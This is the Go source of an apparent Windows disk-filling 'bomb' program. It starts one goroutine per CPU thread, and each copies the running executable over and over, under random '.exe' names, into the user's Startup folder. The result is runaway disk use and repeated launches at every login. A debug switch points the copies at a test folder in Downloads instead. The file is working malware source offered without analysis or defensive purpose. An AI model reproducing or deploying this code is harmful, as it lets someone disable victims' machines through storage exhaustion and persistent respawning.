package main

import (
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/user"
	"path"
	"runtime"
	"strings"
	"time"
)

var __DEBUG_str = "true"
var DEBUG = true

func Debug() bool {
	if DEBUG {
		return true
	}

	if __DEBUG_str == "true" {
		// Set DEBUG to true so we don't constantly check a strings value
		DEBUG = true
		return true
	}

	return false
}

func verbose(prefix string, log any) {
	if Debug() {
		fmt.Printf("[%s]:\t\t%v\n", prefix, log)
	}
}

// Get the current processes startup folder
func getProcessFolder() string {
	path, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	return path
}

// Get the current username
func getUsername() string {
	user, err := user.Current()

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	name_a := strings.Split(user.Username, "\\")
	name := name_a[len(name_a)-1]

	return name
}

// Copy a file to.. Somewhere else
func copy(srcFile string, dstFile string) {
	src, err := os.Open(srcFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer src.Close()

	dst, err := os.Create(dstFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer dst.Close()

	_, err = io.Copy(dst, src)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func ensureDir(directory string) {
	if _, err := os.Stat(directory); os.IsNotExist(err) {
		err = os.MkdirAll(directory, 0755)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

func whileCopy(src string, targetDir string, fileNameBase string) {
	ensureDir(targetDir)

	targetFile := path.Join(targetDir, fileNameBase)

	for {
		copy(src, fmt.Sprintf("%s.%d.exe", targetFile, rand.Int63()))
	}
}

func main() {
	this := getProcessFolder()
	verbose("this", this)

	user := getUsername()
	verbose("user", user)

	startup := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", user)
	verbose("strt", startup)

	if Debug() {
		// Use this to verify it works
		startup = fmt.Sprintf("C:\\Users\\%s\\Downloads\\FOKBOMB_TMP", user)
		verbose("rsgn", startup)
	}

	// Get the number of threads the CPU supports
	threads := runtime.NumCPU()

	verbose("Start copy...", "lol")
	for i := 0; i < threads; i++ {
		verbose("gort", i)

		// Start copying on a new goroutine
		go whileCopy(this, startup, "fok") // ".exe" is added in whileCopy()->copy()
	}

	// Prevent app exit
	for {
		time.Sleep(time.Second)
	}
}
